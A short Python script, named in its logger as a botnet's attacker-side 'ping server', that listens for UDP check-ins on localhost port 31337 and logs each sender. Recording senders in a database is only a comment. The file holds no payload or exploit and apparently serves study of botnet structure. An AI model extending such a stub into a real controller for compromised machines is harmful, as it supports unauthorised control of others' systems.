import logging
import socketserver
import sqlite3

HOST = 'localhost'
PORT = 31337


logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime).19s] %(levelname)s (%(name)s) %(message)s')
log = logging.getLogger('botnet.attacker.ping_server')


class UDPHandler(socketserver.BaseRequestHandler):
    def handle(self):
        log.info(f'Received ping from {self.client_address}')
        # add to sqlite3 database


if __name__ == '__main__':
    log.info(f'Listening for pings on {HOST}:{PORT}...')

    listener = socketserver.UDPServer((HOST, PORT), UDPHandler)
    listener.serve_forever()
